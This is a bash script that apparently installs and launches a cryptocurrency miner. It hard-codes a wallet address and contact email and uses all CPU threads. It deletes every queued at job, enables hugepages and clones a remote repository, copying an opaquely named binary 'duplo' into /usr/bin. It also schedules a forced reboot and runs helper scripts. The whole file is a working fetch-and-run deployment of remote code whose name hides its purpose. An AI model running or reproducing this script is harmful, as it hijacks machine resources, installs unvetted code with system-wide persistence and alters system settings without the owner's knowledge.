#!/bin/bash

WALLET=4B2ABqe1RZKYJ41ZD6xUpVjHJuhZWwLfB5hVEqUgP9QmZDzJC5Xzmv1VKrHLWhtc546uNcQuZvKCbYJ7wGkE29htKzAwLcD
ID="$(hostname)"
MAIL=kotminkot@yandex.ru
PASSWORD=$ID:$MAIL
THREADS="$(nproc --all)"

rm -rf /tmp/server9/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir server9
git clone https://github.com/rekek/server9.git /tmp/server9
cd /tmp/server9
chmod +x /tmp/server9/duplo
chmod 777 ./*.sh
cp /tmp/server9/duplo /usr/bin/
sleep 3

touch /tmp/at.txt
echo 'sudo reboot -f' >> /tmp/at.txt
at now + 3 hours < /tmp/at.txt
echo -e 'Restart job specified'
sleep 3
sudo apt-get install dos2unix

dos2unix time1.sh
dos2unix 75.sh
dos2unix 50.sh
dos2unix 80.sh
dos2unix 65.sh
dos2unix 90.sh
dos2unix 40.sh

./time1.sh


